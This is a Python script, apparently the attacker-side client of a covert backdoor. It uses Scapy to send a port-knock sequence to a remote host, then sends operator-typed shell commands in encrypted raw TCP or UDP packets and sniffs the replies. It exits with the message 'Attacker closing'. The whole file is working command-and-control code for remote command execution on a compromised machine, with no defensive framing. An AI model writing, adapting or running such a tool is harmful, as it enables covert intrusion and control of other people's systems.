#!/usr/bin/python3
"""
pip install netifaces
dnf install python3-devel python-devel
pip install pycrypto
"""
from __future__ import print_function
import time, os, sys, logging
import config
from scapy.all import *
import netifaces
import encryption

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

localIP = config.localIP
localPort = config.localPort
remoteIP = config.remoteIP
remotePort = config.remotePort
protocol = config.protocol

def checkRootPrivilege():
    if os.getuid() != 0:
        sys.exit("This application have to run with root access. Try again")

def portKnocking():
    ports = config.portKnocks
    for port in ports:
        packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)
        send(packet)
        time.sleep(config.delay)

def sendCommand():
    cmd = input("Enter command: ")
    payload = encryption.encrypt(config.password + cmd)
    if protocol.upper() == 'TCP':
        packet = IP(dst=config.remoteIP, src=config.localIP)/TCP(dport=config.remotePort, sport=config.localPort)/Raw(load=payload)
    elif protocol.upper() == 'UDP':
        packet = IP(dst=config.remoteIP, src=config.localIP)/UDP(dport=config.remotePort, sport=config.localPort)/Raw(load=payload)
    send(packet, verbose=True)

def parsePacket(packet):
    """
    """
    if packet.haslayer(protocol):
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            print("Payload: %s" % payload)

def is_incoming(packet):
    """
    Check if packets are incoming or outgoing.
    """
    # Get the default hardware interface
    defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']

    return packet[Ether].src != hardwareAddr

def listen(mFilter):
    sniff(lfilter=is_incoming, filter=mFilter, prn=parsePacket, count=1)

def main():
    mFilter = protocol + " src port " + str(remotePort) + " and dst port " + \
            str(localPort) + " and src host " + remoteIP
    try:
        checkRootPrivilege()
        portKnocking()
        while True:
            sendCommand()
            print(mFilter)
            listen(mFilter)
    except KeyboardInterrupt:
        print('Attacker closing...\n')
        sys.exit(0)

if __name__ == '__main__':
    main()
